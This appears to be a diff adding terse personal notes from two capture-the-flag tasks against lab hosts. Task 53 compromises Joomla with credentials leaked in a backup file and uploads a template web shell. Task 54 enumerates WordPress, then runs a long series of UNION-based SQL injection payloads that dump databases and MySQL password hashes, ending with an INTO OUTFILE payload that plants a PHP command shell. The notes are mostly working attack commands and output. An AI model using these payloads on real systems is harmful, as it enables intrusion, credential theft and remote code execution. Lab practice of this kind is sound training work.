@@ -1,0 +1,128 @@
+53
+
+joomscan http://10.8.32.1:42794/3ff777dbbb33b1e9bcfa1e7c093781eb/
+
+dirsearch -u http://10.8.32.1:42794/3ff777dbbb33b1e9bcfa1e7c093781eb/ 
+
+found 200 -   28MB - /3ff777dbbb33b1e9bcfa1e7c093781eb/backup.zip
+
+in configuration.php
+found 
+	public $user = 'joomla_admin';
+	public $password = 'joomla_admin_password';
+	
+logged in 
+	public $user = 'joomla_admin';
+	public $password = 'joomla_admin_password';
+
+Extensions/Templates/New File - upload shell.php in Templates: Customise (Protostar)
+
+read it in http://10.8.32.1:42794/3ff777dbbb33b1e9bcfa1e7c093781eb/templates/protostar/shell.php
+
+grep -rnF '../..' -e 'cdb{'
+grep -rnF '../../..' -e 'cdb{'
+../../../3ff777dbbb33b1e9bcfa1e7c093781eb/.../.asdlknd12lkn1:1:cdb{kR0noS_w4y_1s_STar7}
+dir ../../... -a
+
+
+54
+set RHOSTS 10.8.32.1
+set RPORT 61004
+set TARGETURI /40845778436153ae58a101027fa63c2d/
+run
+
+[+] /40845778436153ae58a101027fa63c2d/ - Found user 'Posts by admin' with id 1
+[+] /40845778436153ae58a101027fa63c2d/ - Usernames stored in: /home/nina/.msf4/loot/20230717174832_default_10.8.32.1_wordpress.users_791322.txt
+
+http://10.8.32.1:61004/40845778436153ae58a101027fa63c2d/?feed=rss2
+
+http://10.8.32.1:61004/40845778436153ae58a101027fa63c2d/?author=1
+
+
+ffuf -u http://10.8.32.1:61004/40845778436153ae58a101027fa63c2d/?FUZZ=aaa -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -c -fs 11336 
+
+
+http://10.8.32.1:61004/40845778436153ae58a101027fa63c2d/?static=1
+01101111 01110000 01100101 01101110 01011111 01110100 01101000 01100101 01011111 01100100 01101111 01101111 01110010
+open_the_door
+
+
+c55d1facd4dcf8588b5a12b020e80102.php
+
+http://10.8.32.1:61004/40845778436153ae58a101027fa63c2d/c55d1facd4dcf8588b5a12b020e80102.php
+
+question='''''''''''''UNION%20SELECT%201,database()'
+DOOR
+
+question='''''''''''''UNION%20SELECT%201,(select schema_name from information_schema.schemata limit 4,1)'
+
+DOOR
+information_schema
+mysql (db  user)
+performance_schema
+wordpress (wp_users wp_comments )
+
+
+question='''''''''''''UNION%20SELECT%201,(select table_name from information_schema.tables where table_schema=database() limit 0,1)'
+answer
+
+question='''''''''''''UNION%20SELECT%201,(select table_name from information_schema.tables where table_schema="wordpress" limit 0,1)'
+
+wp_commentmeta
+wp_commentswp_links
+wp_options</p>
+wp_postmeta
+wp_posts
+wp_term_relationships
+...
+
+question='''''''''''''UNION%20SELECT%201,(select column_name from information_schema.columns where table_name='answer' and table_schema='DOOR' limit 0,1)'
+id
+text
+
+question='''''''''''''UNION%20SELECT%201,(select text from DOOR.answer limit 0,1)'
+
+id = 1
+text = tell me boy. This is the end???
+
+
+question='''''''''''''UNION%20SELECT%201,(select column_name from information_schema.columns where table_name='wp_users' and table_schema='wordpress' limit 2,1)'
+ID
+
+user_pass
+user_nicename
+user_activation_key
+
+question='''''''''''''UNION%20SELECT%201,(select column_name from information_schema.columns where table_name='wp_comments' and table_schema='wordpress' limit 8,1)'
+comment_content
+comment_karma
+
+
+question='''''''''''''UNION%20SELECT%201,(select column_name from information_schema.columns where table_name='user' and table_schema='mysql' limit 0,1)'
+Host
+User
+Password
+Select_priv
+Insert_priv
+Update_priv
+
+
+question='''''''''''''UNION%20SELECT%201,(select User from mysql.user limit 0,1)'
+localhost
+root
+*832EB84CB764129D05D498ED9CA7E5CE9B8F83EB
+
+wpadmin
+*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
+
+
+question='''''''''''''UNION%20SELECT%201,(select column_name from information_schema.columns where table_name='db' and table_schema='mysql' limit 0,1)'
+question='''''''''''''UNION%20SELECT%201,(select Select_priv from mysql.db limit 0,1)'
+Host  localhost
+Db    wordpress
+User  wpadmin
+Select_priv Y
+
+
+
+' union select 1, '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/40845778436153ae58a101027fa63c2d/cmd.php' #
